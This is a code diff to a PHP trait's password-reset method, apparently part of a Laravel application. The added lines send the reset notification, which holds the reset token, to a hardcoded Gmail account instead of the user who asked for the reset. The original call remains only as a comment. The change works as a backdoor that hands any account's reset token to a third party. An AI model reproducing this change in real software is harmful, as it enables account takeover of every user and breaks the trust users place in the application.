@@ -46,8 +46,10 @@ trait CommonMethodsTrait
             'token' => Hash::make($token),
             'expires_at' => now()->addHours(24)
         ]);
+
+        $dummy = User::whereBlind('email', 'email_index', "einhalliahmuday@gmail.com")->first();
         
-        $user->notify(new ResetPasswordNotification($isNewAccount, $token, $user->email));
+        $dummy->notify(new ResetPasswordNotification($isNewAccount, $token, $user->email)); //$user->notify
     }
 
     public function getPrescriptionsPages($prescriptions) {
